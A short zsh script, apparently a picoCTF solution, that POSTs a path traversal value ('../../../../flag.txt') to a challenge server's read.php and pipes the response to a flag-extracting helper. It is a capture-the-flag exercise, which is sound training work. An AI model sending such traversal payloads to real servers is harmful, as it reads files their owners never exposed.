#!/bin/zsh
source ~/.zshrc
curl -s -X POST http://saturn.picoctf.net:55827/read.php -d 'filename=../../../../flag.txt&read=' | picogrep
